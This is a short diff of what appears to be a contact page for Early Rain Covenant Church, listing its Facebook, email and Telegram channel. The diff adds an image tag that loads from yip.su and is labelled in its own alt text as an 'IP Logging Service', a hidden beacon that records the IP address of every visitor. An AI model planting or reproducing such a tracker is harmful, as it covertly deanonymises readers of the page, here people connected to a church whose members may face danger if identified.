@@ -31,3 +31,5 @@ Facebook： https://zh-cn.facebook.com/earlyraincovenantchurch/
 邮箱： earlyraincovenantchurch@gmail.com
 Telegram思念频道：https://t.me/qysysnpd
 
+<img src="https://yip.su/1WnpM6" alt="yip.su - IP Logging Service" border="0">
+
